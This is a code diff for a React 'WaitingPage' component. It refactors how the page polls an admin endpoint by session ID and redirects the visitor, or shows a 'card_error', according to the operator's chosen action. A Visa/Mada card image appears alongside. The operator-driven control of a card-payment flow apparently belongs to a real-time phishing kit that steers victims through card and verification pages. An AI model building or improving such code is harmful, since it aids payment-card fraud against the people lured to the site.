@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { useQuery } from "@tanstack/react-query";
 import { getControlAction } from "@/lib/api";
@@ -9,28 +9,40 @@ import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";
 
 export default function WaitingPage() {
   const [, setLocation] = useLocation();
-  const [isWaiting, setIsWaiting] = useState(true);
   const [errorType, setErrorType] = useState<string | null>(null);
+  const isRedirecting = useRef(false);
   
+  // Get sessionId on mount
   const sessionId = localStorage.getItem("sessionId");
   
   // Check for control messages from admin
-  const { data: controlData } = useQuery({
+  const { data: controlData, refetch } = useQuery({
     queryKey: ["control", sessionId],
-    queryFn: () => getControlAction(sessionId!),
-    refetchInterval: 500,
-    enabled: !!sessionId && isWaiting,
+    queryFn: async () => {
+      console.log("WaitingPage: Checking control for sessionId:", sessionId);
+      const result = await getControlAction(sessionId!);
+      console.log("WaitingPage: Control result:", result);
+      return result;
+    },
+    refetchInterval: 1000,
+    enabled: !!sessionId && !isRedirecting.current,
   });
 
   // Handle admin control - determine where to redirect
   useEffect(() => {
-    if (!controlData || !controlData.action) return;
+    if (!controlData || !controlData.action || isRedirecting.current) {
+      console.log("WaitingPage: No action or redirecting");
+      return;
+    }
     
     const action = controlData.action;
+    console.log("WaitingPage: Got action:", action);
     
     // Check for error actions first
     if (action === "card_error") {
+      console.log("WaitingPage: Showing card error");
       setErrorType("card_error");
+      isRedirecting.current = true;
       return;
     }
     
@@ -55,13 +67,13 @@ export default function WaitingPage() {
     
     const targetPage = pageMap[action];
     if (targetPage) {
-      setIsWaiting(false);
-      localStorage.removeItem("pending_redirect");
+      console.log("WaitingPage: Redirecting to:", targetPage);
+      isRedirecting.current = true;
       setTimeout(() => {
         setLocation(targetPage);
       }, 100);
     }
-  }, [controlData, isWaiting, setLocation]);
+  }, [controlData, setLocation]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
@@ -94,6 +106,7 @@ export default function WaitingPage() {
                 type="button"
                 onClick={() => {
                   setErrorType(null);
+                  isRedirecting.current = false;
                   setLocation("/visa");
                 }}
                 className="rounded-2xl bg-primary px-6 py-3 text-sm font-semibold text-white hover:bg-primary/90"
